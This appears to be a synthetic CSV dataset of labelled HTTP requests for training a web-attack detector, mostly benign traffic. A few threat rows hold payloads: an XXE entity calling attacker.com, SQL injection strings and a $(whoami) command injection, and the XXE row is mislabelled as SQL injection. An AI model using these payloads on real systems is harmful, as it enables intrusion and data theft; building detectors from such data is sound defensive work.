body,confidence,headers,id,injection_point,label,method,path,pattern,source_ip,threat_type,timestamp
normal=data&field=value,0.9119058853955924,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"", ""Accept"": ""*/*"", ""Connection"": ""close"", ""X-Custom-Header"": ""<!ENTITY xxe SYSTEM 'http://attacker.com/evil.dtd'>"", ""Content-Type"": ""application/x-www-form-urlencoded""}",threat_88862,header,threat,POST,/settings,<!ENTITY xxe SYSTEM 'http://attacker.com/evil.dtd'>,241.205.170.199,sql_injection,2025-11-23T15:53:09.989660
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""multipart/form-data""}",benign_16284,,benign,POST,/api/users?id=asc&page=name&sort=56,,105.32.82.134,,2025-11-24T00:21:35.986665
"{""name"": ""user_895"", ""email"": ""user963@example.com"", ""age"": 38}",0.0,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",benign_81897,,benign,POST,/register?sort=64&limit=vtpgbmtueu&page=price,,96.61.102.156,,2025-11-24T07:39:09.983508
normal=data&field=value,0.8333833880775254,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""*/*"", ""Connection"": ""close"", ""Content-Type"": ""application/x-www-form-urlencoded""}",threat_53669,query,threat,PUT,/search?q=%27%20UNION%20SELECT%20%2A%20FROM%20users%20--,' UNION SELECT * FROM users --,213.243.70.127,sql_injection,2025-11-24T15:05:17.989818
,0.0,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_83190,,benign,DELETE,/register,,119.9.65.199,,2025-11-23T18:26:17.984011
,0.0,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_93087,,benign,DELETE,/privacy?sort=npcdmk&id=40&limit=30,,229.23.68.64,,2025-11-23T20:46:33.984284
,0.0,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_30120,,benign,DELETE,/css/style.css?limit=97&limit=name&id=asc,,74.21.141.227,,2025-11-24T04:58:37.987326
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",benign_83846,,benign,PUT,/profile,,67.159.82.142,,2025-11-24T06:19:54.983010
"{""name"": ""user_888"", ""email"": ""user825@example.com"", ""age"": 60}",0.0,"{""User-Agent"": ""Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",benign_18524,,benign,PUT,/blog,,40.247.192.168,,2025-11-23T20:05:28.988885
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_87083,,benign,GET,/register?id=14&q=name,,58.3.221.105,,2025-11-24T02:12:07.985265
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_80400,,benign,GET,/contact?category=name&q=xlisqifo&sort=mjkqukgtc,,146.16.95.97,,2025-11-24T07:55:54.983620
,0.7247542250358154,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""*/*"", ""Connection"": ""close"", ""X-Custom-Header"": ""' OR '1'='1""}",threat_39522,header,threat,GET,/privacy,' OR '1'='1,219.217.48.246,sql_injection,2025-11-24T11:15:26.989330
name=John&email=john@example.com&message=Hello,0.0,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""multipart/form-data""}",benign_62333,,benign,PUT,/api/products?page=mjfbi&filter=price&filter=zejtvh,,19.130.11.49,,2025-11-24T13:11:56.988561
name=John&email=john@example.com&message=Hello,0.0,"{""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""multipart/form-data""}",benign_61953,,benign,PUT,/favicon.ico,,117.137.89.222,,2025-11-23T22:29:06.986179
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_81050,,benign,DELETE,/privacy,,112.109.162.29,,2025-11-23T17:17:11.987939
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_83287,,benign,GET,/register?id=17,,225.128.98.236,,2025-11-23T18:54:42.984109
name=John&email=john@example.com&message=Hello,0.0,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""multipart/form-data""}",benign_83918,,benign,POST,/login,,155.138.192.106,,2025-11-24T05:07:47.987525
name=John&email=john@example.com&message=Hello,0.0,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""multipart/form-data""}",benign_98209,,benign,POST,/settings,,36.175.48.105,,2025-11-24T01:19:22.985632
name=John&email=john@example.com&message=Hello,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/x-www-form-urlencoded""}",benign_80034,,benign,POST,/api/products,,9.45.22.80,,2025-11-24T03:50:41.987451
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",benign_88445,,benign,POST,/home?filter=92&filter=desc,,82.197.55.225,,2025-11-23T21:49:55.986015
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_43882,,benign,DELETE,/home,,165.165.139.203,,2025-11-24T01:51:02.985357
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",benign_58942,,benign,POST,/favicon.ico,,232.233.87.234,,2025-11-23T15:19:55.988076
,0.0,"{""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""multipart/form-data""}",benign_97224,,benign,POST,/api/orders?q=name,,134.172.248.166,,2025-11-24T05:38:42.982579
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_86463,,benign,GET,/settings?page=kvbqg,,7.117.54.87,,2025-11-24T12:37:51.984246
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_67746,,benign,GET,/search?filter=wqydmwnan&q=price&limit=xnzlmh,,199.8.82.197,,2025-11-23T20:13:13.982254
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_52996,,benign,GET,/help?limit=date&sort=hsrsywnnqc,,172.190.80.73,,2025-11-24T07:12:41.982167
name=John&email=john@example.com&message=Hello,0.0,"{""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""multipart/form-data""}",benign_18452,,benign,POST,/privacy?category=name,,29.143.231.5,,2025-11-23T23:09:54.983934
"{""name"": ""user_744"", ""email"": ""user922@example.com"", ""age"": 18}",0.0,"{""User-Agent"": ""Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",benign_16246,,benign,PUT,/services,,188.152.151.172,,2025-11-24T11:36:19.988738
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_85976,,benign,DELETE,/register,,140.86.129.53,,2025-11-23T15:45:28.981945
name=John&email=john@example.com&message=Hello,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""multipart/form-data""}",benign_27406,,benign,PUT,/api/orders?sort=mwjzs&page=90&id=date,,117.8.8.185,,2025-11-23T22:36:37.984272
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/x-www-form-urlencoded""}",benign_82366,,benign,POST,/js/app.js,,146.131.28.254,,2025-11-23T18:11:21.986634
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_41851,,benign,GET,/home?filter=date&limit=94&id=koqkiahuf,,118.201.242.20,,2025-11-24T13:55:18.983743
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_96392,,benign,GET,/products,,156.216.200.232,,2025-11-23T22:54:57.989071
normal=data&field=value,0.8956688700994365,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""*/*"", ""Connection"": ""close"", ""X-Custom-Header"": ""$(whoami)"", ""Content-Type"": ""application/x-www-form-urlencoded""}",threat_84129,header,threat,POST,/services,$(whoami),118.41.175.152,command_injection,2025-11-24T12:25:52.989424
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",benign_64542,,benign,POST,/contact,,210.209.119.130,,2025-11-23T22:37:22.982479
"{""name"": ""user_442"", ""email"": ""user551@example.com"", ""age"": 68}",0.0,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",benign_17163,,benign,POST,/news,,176.178.20.113,,2025-11-23T18:00:12.985584
name=John&email=john@example.com&message=Hello,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""multipart/form-data""}",benign_83313,,benign,POST,/login?q=9&limit=gqsvgzd,,95.10.111.1,,2025-11-23T16:56:20.985351
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_26530,,benign,DELETE,/api/orders?page=hvml,,85.67.146.90,,2025-11-24T07:00:05.987103
,0.0,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_59342,,benign,GET,/settings,,193.37.72.15,,2025-11-23T20:42:35.983090
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_39657,,benign,GET,/login,,197.190.55.160,,2025-11-23T19:50:30.987468
,0.0,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",benign_17719,,benign,PUT,/images/logo.png,,246.92.132.157,,2025-11-24T13:00:09.983370
name=John&email=john@example.com&message=Hello,0.0,"{""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/x-www-form-urlencoded""}",benign_19778,,benign,POST,/blog?q=xarhm&limit=nox,,148.69.156.249,,2025-11-24T11:04:08.988641
name=John&email=john@example.com&message=Hello,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/x-www-form-urlencoded""}",benign_71051,,benign,POST,/search?id=asc&q=desc&q=easydnq,,242.141.44.232,,2025-11-24T02:56:58.987865
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_79516,,benign,GET,/blog,,167.104.148.107,,2025-11-24T08:59:00.987761
,0.0,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_40448,,benign,GET,/api/users?q=87&limit=61,,176.200.253.133,,2025-11-24T12:57:33.985076
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",benign_31155,,benign,PUT,/,,225.85.29.244,,2025-11-23T22:27:46.987455
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_18375,,benign,GET,/,,69.140.160.38,,2025-11-24T03:24:02.982729
,0.0,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_72406,,benign,DELETE,/register,,75.231.218.248,,2025-11-23T19:09:49.986474
name=John&email=john@example.com&message=Hello,0.0,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""multipart/form-data""}",benign_91646,,benign,POST,/home,,144.1.54.4,,2025-11-24T01:13:25.985841
,0.0,"{""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/x-www-form-urlencoded""}",benign_78491,,benign,PUT,/faq,,150.202.8.224,,2025-11-24T07:08:34.983898
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_80812,,benign,DELETE,/home,,68.139.210.8,,2025-11-24T12:41:08.988352
,0.0,"{""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_52676,,benign,GET,/api/users,,72.235.95.36,,2025-11-24T13:55:30.987283
,0.0,"{""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",benign_19443,,benign,PUT,/dashboard,,84.46.99.74,,2025-11-24T08:22:13.984330
,0.0,"{""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_75313,,benign,DELETE,/login,,102.128.79.19,,2025-11-24T05:22:11.982743
,0.0,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_55707,,benign,GET,/?filter=date&q=desc,,49.126.44.12,,2025-11-24T12:55:47.983891
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_88701,,benign,DELETE,/api/status,,150.48.189.98,,2025-11-23T21:34:32.983350
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",benign_59798,,benign,POST,/profile,,216.20.61.82,,2025-11-23T22:16:21.985500
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_93752,,benign,DELETE,/profile,,86.239.152.195,,2025-11-24T01:20:39.984754
,0.0,"{""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Connection"": ""keep-alive""}",benign_49332,,benign,DELETE,/products?id=price,,192.87.73.139,,2025-11-24T07:27:39.986715
